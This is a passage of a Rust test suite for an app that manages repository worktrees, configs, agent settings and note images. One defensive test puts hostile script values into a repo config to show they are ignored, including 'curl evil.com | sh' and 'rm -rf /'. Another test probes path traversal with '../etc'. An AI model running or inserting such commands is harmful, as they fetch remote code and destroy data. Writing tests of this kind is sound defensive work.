        let json2 = serde_json::to_string_pretty(&updated).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json2).unwrap();
        fs::rename(&temp, &target).unwrap();

        // Verify the new content is there
        let loaded: NotificationConfig =
            serde_json::from_str(&fs::read_to_string(&target).unwrap()).unwrap();
        assert!(loaded.enabled);

        // Verify no temp file remains
        assert!(!temp.exists());
    }

    #[cfg(unix)]
    #[test]
    fn save_json_config_sets_restrictive_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let dir = TempDir::new().unwrap();
        let filename = "perms-test.json";
        let target = dir.path().join(filename);

        let cfg = NotificationConfig::default();
        let json = serde_json::to_string_pretty(&cfg).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json).unwrap();

        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(&temp, perms).unwrap();
        fs::rename(&temp, &target).unwrap();

        let metadata = fs::metadata(&target).unwrap();
        let mode = metadata.permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "Config file should be owner-only (0600)");
    }

    #[test]
    fn has_custom_settings_true_when_base_branch_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("main".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_ignored_files() {
        let entry = RepoSettingsEntry {
            copy_ignored_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_copy_untracked_files() {
        let entry = RepoSettingsEntry {
            copy_untracked_files: Some(true),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_setup_script_set() {
        let entry = RepoSettingsEntry {
            setup_script: Some("npm install".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_run_script_set() {
        let entry = RepoSettingsEntry {
            run_script: Some("npm start".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_archive_script_set() {
        let entry = RepoSettingsEntry {
            archive_script: Some("cleanup.sh".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_color_set() {
        let entry = RepoSettingsEntry {
            color: "#ff0000".to_string(),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_multiple_fields_changed() {
        let entry = RepoSettingsEntry {
            base_branch: Some("develop".to_string()),
            setup_script: Some("make build".to_string()),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn invalid_split_tab_mode_fails_deserialization() {
        // An invalid split_tab_mode value should cause deserialization to fail,
        // which load_json_config handles by returning Default
        let json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null,"split_tab_mode":"bogus"}"#;
        let result: Result<AppConfig, _> = serde_json::from_str(json);
        assert!(
            result.is_err(),
            "Invalid split_tab_mode should fail deserialization"
        );
    }

    #[test]
    fn split_tab_mode_serializes_as_lowercase() {
        let cfg = AppConfig {
            split_tab_mode: SplitTabMode::Unified,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""split_tab_mode":"unified""#));

        let cfg2 = AppConfig::default();
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""split_tab_mode":"separate""#));
    }

    #[test]
    fn tab_ordering_mode_serializes_as_kebab_case() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        assert!(json.contains(r#""tab_ordering_mode":"terminals-first""#));

        let cfg2 = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json2 = serde_json::to_string(&cfg2).unwrap();
        assert!(json2.contains(r#""tab_ordering_mode":"free""#));

        let cfg3 = AppConfig::default();
        let json3 = serde_json::to_string(&cfg3).unwrap();
        assert!(json3.contains(r#""tab_ordering_mode":"grouped-by-type""#));
    }

    #[test]
    fn tab_ordering_mode_round_trip() {
        let cfg = AppConfig {
            tab_ordering_mode: TabOrderingMode::Free,
            ..AppConfig::default()
        };
        let json = serde_json::to_string(&cfg).unwrap();
        let loaded: AppConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(loaded.tab_ordering_mode, TabOrderingMode::Free);
    }

    #[test]
    fn agents_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut agents = AgentsConfig::default();
        let mut env = HashMap::new();
        env.insert("ANTHROPIC_API_KEY".to_string(), "sk-test".to_string());
        agents.agents.insert(
            "claude".to_string(),
            AgentSettings {
                run_configs: vec![
                    AgentRunConfig {
                        name: "Default".to_string(),
                        command: "claude".to_string(),
                        args: vec![],
                        env: HashMap::new(),
                        is_default: true,
                    },
                    AgentRunConfig {
                        name: "Sonnet Print".to_string(),
                        command: "claude".to_string(),
                        args: vec![
                            "--model".to_string(),
                            "sonnet".to_string(),
                            "--print".to_string(),
                        ],
                        env,
                        is_default: false,
                    },
                ],
                auto_retry_on_error: false,
                headless_template: None,
                env_flags: HashMap::new(),
                intent_tab_title: Some(false),
                suggest_followups: None,
            },
        );
        let loaded: AgentsConfig = round_trip_in_dir(dir.path(), "agents.json", &agents);
        assert_eq!(loaded.agents.len(), 1);
        let claude = loaded.agents.get("claude").unwrap();
        assert_eq!(claude.run_configs.len(), 2);
        assert_eq!(claude.run_configs[0].name, "Default");
        assert!(claude.run_configs[0].is_default);
        assert_eq!(claude.run_configs[1].name, "Sonnet Print");
        assert_eq!(
            claude.run_configs[1].args,
            vec!["--model", "sonnet", "--print"]
        );
        assert_eq!(
            claude.run_configs[1].env.get("ANTHROPIC_API_KEY").unwrap(),
            "sk-test"
        );
        assert!(!claude.run_configs[1].is_default);
        assert_eq!(claude.intent_tab_title, Some(false));
        assert_eq!(claude.suggest_followups, None);
    }

    #[test]
    fn agents_config_missing_file_returns_default() {
        let cfg: AgentsConfig = load_json_config("nonexistent-agents-12345.json");
        assert!(cfg.agents.is_empty());
    }

    // -- Worktree config tests --

    #[test]
    fn worktree_enums_serialize_as_expected() {
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::Sibling).unwrap(),
            r#""sibling""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::AppDir).unwrap(),
            r#""app-dir""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::InsideRepo).unwrap(),
            r#""inside-repo""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeStorage::ClaudeCodeDefault).unwrap(),
            r#""claude-code-default""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&OrphanCleanup::On).unwrap(),
            r#""on""#
        );
        assert_eq!(
            serde_json::to_string(&MergeStrategy::Squash).unwrap(),
            r#""squash""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Archive).unwrap(),
            r#""archive""#
        );
        assert_eq!(
            serde_json::to_string(&WorktreeAfterMerge::Delete).unwrap(),
            r#""delete""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Off).unwrap(),
            r#""off""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Ask).unwrap(),
            r#""ask""#
        );
        assert_eq!(
            serde_json::to_string(&AutoDeleteOnPrClose::Auto).unwrap(),
            r#""auto""#
        );
    }

    #[test]
    fn worktree_enums_deserialize() {
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""sibling""#).unwrap(),
            WorktreeStorage::Sibling
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""app-dir""#).unwrap(),
            WorktreeStorage::AppDir
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""inside-repo""#).unwrap(),
            WorktreeStorage::InsideRepo
        );
        assert_eq!(
            serde_json::from_str::<WorktreeStorage>(r#""claude-code-default""#).unwrap(),
            WorktreeStorage::ClaudeCodeDefault
        );
        assert_eq!(
            serde_json::from_str::<OrphanCleanup>(r#""ask""#).unwrap(),
            OrphanCleanup::Ask
        );
        assert_eq!(
            serde_json::from_str::<MergeStrategy>(r#""rebase""#).unwrap(),
            MergeStrategy::Rebase
        );
        assert_eq!(
            serde_json::from_str::<WorktreeAfterMerge>(r#""ask""#).unwrap(),
            WorktreeAfterMerge::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""off""#).unwrap(),
            AutoDeleteOnPrClose::Off
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""ask""#).unwrap(),
            AutoDeleteOnPrClose::Ask
        );
        assert_eq!(
            serde_json::from_str::<AutoDeleteOnPrClose>(r#""auto""#).unwrap(),
            AutoDeleteOnPrClose::Auto
        );
    }

    #[test]
    fn repo_defaults_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = RepoDefaultsConfig {
            worktree_storage: WorktreeStorage::InsideRepo,
            prompt_on_create: false,
            delete_branch_on_remove: false,
            auto_archive_merged: true,
            orphan_cleanup: OrphanCleanup::On,
            pr_merge_strategy: MergeStrategy::Squash,
            after_merge: WorktreeAfterMerge::Delete,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::Auto,
            ..RepoDefaultsConfig::default()
        };
        let loaded: RepoDefaultsConfig = round_trip_in_dir(dir.path(), "repo-defaults.json", &cfg);
        assert_eq!(loaded.worktree_storage, WorktreeStorage::InsideRepo);
        assert!(!loaded.prompt_on_create);
        assert!(!loaded.delete_branch_on_remove);
        assert!(loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::On);
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Delete);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Auto);
    }

    #[test]
    fn repo_defaults_serde_default_for_worktree_fields() {
        // Old config without worktree fields should deserialize with defaults
        let json = r#"{"base_branch":"automatic","copy_ignored_files":false}"#;
        let loaded: RepoDefaultsConfig = serde_json::from_str(json).unwrap();
        assert_eq!(loaded.worktree_storage, WorktreeStorage::Sibling);
        assert!(loaded.prompt_on_create);
        assert!(loaded.delete_branch_on_remove);
        assert!(!loaded.auto_archive_merged);
        assert_eq!(loaded.orphan_cleanup, OrphanCleanup::Ask);
        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Merge);
        assert_eq!(loaded.after_merge, WorktreeAfterMerge::Archive);
        assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Off);
    }

    #[test]
    fn repo_settings_entry_worktree_fields_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                worktree_storage: Some(WorktreeStorage::AppDir),
                prompt_on_create: Some(false),
                delete_branch_on_remove: Some(false),
                auto_archive_merged: Some(true),
                orphan_cleanup: Some(OrphanCleanup::Off),
                pr_merge_strategy: Some(MergeStrategy::Rebase),
                after_merge: Some(WorktreeAfterMerge::Ask),
                auto_delete_on_pr_close: Some(AutoDeleteOnPrClose::Ask),
                ..RepoSettingsEntry::default()
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.worktree_storage, Some(WorktreeStorage::AppDir));
        assert_eq!(entry.prompt_on_create, Some(false));
        assert_eq!(entry.delete_branch_on_remove, Some(false));
        assert_eq!(entry.auto_archive_merged, Some(true));
        assert_eq!(entry.orphan_cleanup, Some(OrphanCleanup::Off));
        assert_eq!(entry.pr_merge_strategy, Some(MergeStrategy::Rebase));
        assert_eq!(entry.after_merge, Some(WorktreeAfterMerge::Ask));
        assert_eq!(
            entry.auto_delete_on_pr_close,
            Some(AutoDeleteOnPrClose::Ask)
        );
    }

    #[test]
    fn repo_settings_entry_null_worktree_fields() {
        // Old repo settings without worktree fields should have None
        let json = r#"{"path":"/my/repo","display_name":"test","base_branch":"main"}"#;
        let entry: RepoSettingsEntry = serde_json::from_str(json).unwrap();
        assert_eq!(entry.worktree_storage, None);
        assert_eq!(entry.prompt_on_create, None);
        assert_eq!(entry.delete_branch_on_remove, None);
        assert_eq!(entry.orphan_cleanup, None);
    }

    #[test]
    fn has_custom_settings_true_when_worktree_storage_set() {
        let entry = RepoSettingsEntry {
            worktree_storage: Some(WorktreeStorage::InsideRepo),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    #[test]
    fn has_custom_settings_true_when_prompt_on_create_set() {
        let entry = RepoSettingsEntry {
            prompt_on_create: Some(false),
            ..RepoSettingsEntry::default()
        };
        assert!(entry.has_custom_settings());
    }

    // -- Note image tests --
    // These tests use the global config_dir override and must run serially.

    #[test]
    #[serial_test::serial]
    fn save_note_image_creates_file() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // A minimal valid PNG (1x1 pixel)
        let png_bytes: &[u8] = &[
            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE,
        ];
        let b64 = general_purpose::STANDARD.encode(png_bytes);

        let result = save_note_image("test-note-1".to_string(), b64, "png".to_string());
        assert!(
            result.is_ok(),
            "save_note_image should succeed: {:?}",
            result
        );

        let path = std::path::PathBuf::from(result.unwrap());
        assert!(path.exists(), "Image file should exist on disk");
        assert!(path.to_string_lossy().contains("note-images/test-note-1/"));
        assert!(path.to_string_lossy().ends_with(".png"));

        // Verify content matches
        let saved = fs::read(&path).unwrap();
        assert_eq!(saved, png_bytes);
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_oversized() {
        use base64::{Engine as _, engine::general_purpose};

        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create data slightly over 10 MB
        let big_data = vec![0u8; MAX_IMAGE_SIZE + 1];
        let b64 = general_purpose::STANDARD.encode(&big_data);

        let result = save_note_image("test-note-big".to_string(), b64, "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too large"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_invalid_base64() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image(
            "test-note-bad".to_string(),
            "not-valid-base64!!!@@@".to_string(),
            "png".to_string(),
        );
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Invalid base64"));
    }

    #[test]
    #[serial_test::serial]
    fn save_note_image_rejects_path_traversal() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = save_note_image("../etc".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("invalid characters"));

        let result2 = save_note_image("foo/bar".to_string(), "AAAA".to_string(), "png".to_string());
        assert!(result2.is_err());
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_removes_directory() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Create a note-images dir with files
        let note_dir = dir.path().join("note-images").join("note-to-delete");
        fs::create_dir_all(&note_dir).unwrap();
        fs::write(note_dir.join("img1.png"), b"fake-png").unwrap();
        fs::write(note_dir.join("img2.png"), b"fake-png-2").unwrap();
        assert!(note_dir.exists());

        let result = delete_note_assets("note-to-delete".to_string());
        assert!(result.is_ok());
        assert!(!note_dir.exists(), "Directory should be removed");
    }

    #[test]
    #[serial_test::serial]
    fn delete_note_assets_noop_when_missing() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = delete_note_assets("nonexistent-note".to_string());
        assert!(result.is_ok(), "Should succeed even if dir doesn't exist");
    }

    #[test]
    fn repo_local_config_loads_valid_json() {
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "delete_branch_on_remove": false,
            "pr_merge_strategy": "squash"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();

        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        assert_eq!(config.delete_branch_on_remove, Some(false));
        assert_eq!(config.pr_merge_strategy, Some(MergeStrategy::Squash));
        assert!(config.copy_ignored_files.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_when_missing() {
        let dir = TempDir::new().unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_returns_none_for_malformed_json() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "not valid json {{{").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_none());
    }

    #[test]
    fn repo_local_config_handles_empty_object() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join(".tuic.json"), "{}").unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        let config = config.unwrap();
        assert!(config.base_branch.is_none());
    }

    #[test]
    fn repo_local_config_ignores_unknown_fields() {
        let dir = TempDir::new().unwrap();
        let json = r#"{"base_branch": "main", "unknown_field": 42}"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(config.is_some());
        assert_eq!(config.unwrap().base_branch.as_deref(), Some("main"));
    }

    #[test]
    fn repo_local_config_ignores_script_fields() {
        // Script fields (setup_script, run_script, archive_script) were intentionally
        // removed from RepoLocalConfig to prevent executing repo-committed scripts
        // without TOFU confirmation. Verify they are silently ignored.
        let dir = TempDir::new().unwrap();
        let json = r#"{
            "base_branch": "develop",
            "setup_script": "curl evil.com | sh",
            "run_script": "rm -rf /",
            "archive_script": "echo pwned"
        }"#;
        fs::write(dir.path().join(".tuic.json"), json).unwrap();
        let config = load_repo_local_config_from_path(dir.path());
        assert!(
            config.is_some(),
            "config should parse despite unknown script fields"
        );
        let config = config.unwrap();
        assert_eq!(config.base_branch.as_deref(), Some("develop"));
        // RepoLocalConfig has no script fields — they are silently dropped by serde
        // No field to assert on; the fact that parsing succeeds without script
        // fields on the struct is the security guarantee.
    }

    #[test]
    #[serial_test::serial]
    fn get_note_images_dir_returns_path() {
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let result = get_note_images_dir();
        assert!(
            result.ends_with("note-images"),
            "Should end with note-images, got: {result}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn copy_dir_recursive_preserves_symlinks() {
        let src = TempDir::new().unwrap();
        let dst = TempDir::new().unwrap();

        // Create a real file and a symlink to it
        let real_file = src.path().join("real.txt");
        fs::write(&real_file, "hello").unwrap();
        let link_path = src.path().join("link.txt");
        std::os::unix::fs::symlink(&real_file, &link_path).unwrap();

        // Create a real subdir and a symlink to it
        let sub = src.path().join("subdir");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("inner.txt"), "world").unwrap();
        let dir_link = src.path().join("dir-link");
        std::os::unix::fs::symlink(&sub, &dir_link).unwrap();

        let dest = dst.path().join("out");
        copy_dir_recursive(src.path(), &dest).unwrap();

        // Verify the file symlink was recreated (not copied as a regular file)
        let dest_link = dest.join("link.txt");
        assert!(
            dest_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_link).unwrap(), real_file);

        // Verify the dir symlink was recreated
        let dest_dir_link = dest.join("dir-link");
        assert!(
            dest_dir_link
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_link(&dest_dir_link).unwrap(), sub);

        // Verify the real file was copied normally
        assert!(
            !dest
                .join("real.txt")
                .symlink_metadata()
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(fs::read_to_string(dest.join("real.txt")).unwrap(), "hello");
    }

    #[test]
    fn is_experimental_enabled_gates_on_parent() {
        let mut cfg = AppConfig::default();
        assert!(!cfg.is_experimental_enabled(true));
        assert!(!cfg.is_experimental_enabled(false));

        cfg.experimental_features_enabled = true;
        assert!(cfg.is_experimental_enabled(true));
        assert!(!cfg.is_experimental_enabled(false));
    }
}
